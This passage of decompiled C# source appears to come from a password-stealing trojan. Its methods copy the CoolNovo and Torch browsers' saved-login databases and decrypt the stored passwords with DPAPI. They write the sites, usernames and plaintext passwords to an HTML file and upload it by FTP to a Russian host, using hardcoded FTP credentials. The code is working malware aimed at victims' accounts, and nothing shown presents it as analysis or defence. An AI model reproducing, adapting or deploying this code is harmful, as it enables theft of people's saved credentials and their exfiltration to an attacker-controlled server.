			string ftpfilepath = "/Torch" + num + Environment.UserName + ".html";
			string text5 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\" + text4);
			string text6 = Environment.ExpandEnvironmentVariables("Sustem.html");
			File.Copy(text6, text5, overwrite: true);
			File.Delete(text6);
			ftpfile(ftpfilepath, text5);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Exception innerException = ex.InnerException;
		}
	}

	private static void CoolNovobrayzer()
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		try
		{
			string sourceFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\MapleStudio\\ChromePlus\\User Data\\Default\\Login Data");
			string destFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\CoolNovo_Login Data");
			File.Copy(sourceFileName, destFileName, overwrite: true);
			string path = "Sustem.html";
			StreamWriter streamWriter = new StreamWriter(path, append: false, Encoding.UTF8);
			string text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\CoolNovo_Login Data");
			string arg = "logins";
			byte[] entropyBytes = null;
			string text2 = "data source=" + text + ";New=True;UseUTF16Encoding=True";
			DataTable dataTable = new DataTable();
			string text3 = string.Format("SELECT * FROM {0} {1} {2}", arg, "", "");
			SQLiteConnection val = new SQLiteConnection(text2);
			try
			{
				SQLiteCommand val2 = new SQLiteCommand(text3, val);
				SQLiteDataAdapter val3 = new SQLiteDataAdapter(val2);
				((DbDataAdapter)(object)val3).Fill(dataTable);
				int count = dataTable.Rows.Count;
				for (int i = 0; i < count; i++)
				{
					streamWriter.Write(i + 1 + ") ");
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][1], "<br>"));
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][3], "<br>"));
					byte[] cipherTextBytes = (byte[])dataTable.Rows[i][5];
					string description;
					byte[] bytes = DPAPI.Decrypt(cipherTextBytes, entropyBytes, out description);
					string @string = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetString(bytes);
					streamWriter.WriteLine(@string + "<br><br>");
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			streamWriter.Close();
			Random random = new Random();
			int num = random.Next(999999999);
			string text4 = "CoolNovo" + num + Environment.UserName + ".html";
			string ftpfilepath = "/CoolNovo" + num + Environment.UserName + ".html";
			string text5 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\" + text4);
			string text6 = Environment.ExpandEnvironmentVariables("Sustem.html");
			File.Copy(text6, text5, overwrite: true);
			File.Delete(text6);
			ftpfile(ftpfilepath, text5);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Exception innerException = ex.InnerException;
		}
	}

	public static void ftpfile(string ftpfilepath, string inputfilepath)
	{
		string text = Environment.ExpandEnvironmentVariables("passnovawin7.viptop.ru/Paroli");
		string requestUriString = "ftp://" + text + ftpfilepath;
		FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(requestUriString);
		ftpWebRequest.Credentials = new NetworkCredential("w457107", "q267dkhq");
		ftpWebRequest.KeepAlive = true;
		ftpWebRequest.UseBinary = true;
		ftpWebRequest.Proxy = null;
		ftpWebRequest.Method = "STOR";
		FileStream fileStream = File.OpenRead(inputfilepath);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, array.Length);
		fileStream.Close();
		Stream requestStream = ftpWebRequest.GetRequestStream();
		requestStream.Write(array, 0, array.Length);
		requestStream.Close();
	}
}
